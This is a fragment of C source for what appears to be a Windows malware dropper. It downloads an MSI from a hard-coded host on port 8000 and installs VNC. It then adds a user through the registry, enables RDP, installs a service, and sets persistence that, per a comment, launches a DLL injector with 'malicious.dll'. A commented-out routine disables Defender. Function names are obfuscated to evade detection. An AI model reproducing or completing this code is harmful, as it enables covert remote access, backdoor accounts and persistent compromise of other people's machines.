	//printf("sizeof(full_string_15) -> %d\n",sizeof(full_string_15));
	//printf("sizeof(\"\\tightVNC.msi\") -> %d\n",sizeof("\\tightVNC.msi"));
	//printf("%s\n",full_string_16);
	
	
	
	
	char full_string_n3t_4[110]; //http://192.168.8.161:8000/tightVNC.msi
	strcpy(full_string_n3t_4,full_string_n3t);
	strcat(full_string_n3t_4,full_string_14);
	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_4);
	dw_ff1e1(full_string_n3t_4,full_string_16,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
	
	// --- END FILE/NET OPS --- //
	
	
	

	// --- START VNC INSTALL --- //
	Vn_in();
	// --- END VNC INSTALL ---//
	// --- START ADD USER --- //
	a66_Uz3_r(cr_key_reg_func,set_key_reg_func,close_key_reg_func);
	// --- END ADD USER --- //
	
	// --- START ENABLE RDP --- //
	en_R_6_P(open_key_reg_func,set_key_reg_func,close_key_reg_func,open_SC_func,open_service_func,start_service_func,close_service_func); //enable rdp
	// --- END ENABLE RDP --- //
	
	
	
	system(full_string_10); // exec win_service32.exe and install the service

	w1n_Rm();

	//PERSISTANCE SHOULD EXECUTE THE DLL_INJECTOR.EXE malicious.dll 
	// --- START PERSISTANCE --- //
	ff_131mva(open_key_reg_func,set_key_reg_func,close_key_reg_func);
	// --- END PERSISTANCE --- //
	
	// --- FORCE START THE SERVICE (for testing) --- //
	// you shouldn't start the service and let it start automatically with bootup
	//all1_901A(open_SC_func,open_service_func,start_service_func,close_service_func);
	
	// --- END START THE SERVICE ---//
	
	// --- START DISABLE DEFENDER --- //
	//faow1231(open_key_reg_func,set_key_reg_func,close_key_reg_func);	//VERY NOISY
	// --- END DISABLE DEFENDER --- //
	
CLEANUP:
	if(hMux){
		//printf("[NtClose] Closing hMux handle\n");
		NT_Close(hMux);
	}
	return EXIT_SUCCESS;
}
